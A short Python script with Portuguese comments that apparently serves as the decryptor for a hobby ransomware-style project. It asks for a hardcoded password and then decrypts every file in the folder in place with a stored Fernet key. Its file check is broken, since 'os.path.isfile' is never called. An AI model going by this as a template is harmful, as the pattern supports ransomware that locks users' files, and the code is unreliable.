import os
from cryptography.fernet import Fernet
files = []

#procura os arquivos na pasta criada
for file in os.listdir():
    #isso diz pra n pegar o arquivo fonte do codigo se n da problema
    if file == "cybershii.py" or file == "Chave.key" or file == "securitshii.py" or file == "lauch.json":
        continue
    if os.path.isfile:
        files.append(file)   
 
#parte da decrypto

with open("Chave.key", "rb") as chave:
    chave_secreta = chave.read()

password = "Eric_is_dumb"   
user_password = input("password please: ")

if user_password == password:
    for file in files:
        with open(file, "rb") as arquivos:
            conteudo = arquivos.read()
        conteudo_decrypt = Fernet(chave_secreta).decrypt(conteudo)
        with open(file, "wb") as arquivos:
            arquivos.write(conteudo_decrypt)
    print("iiih admitiu")
else:
    print("Wrong answer dumb")
    


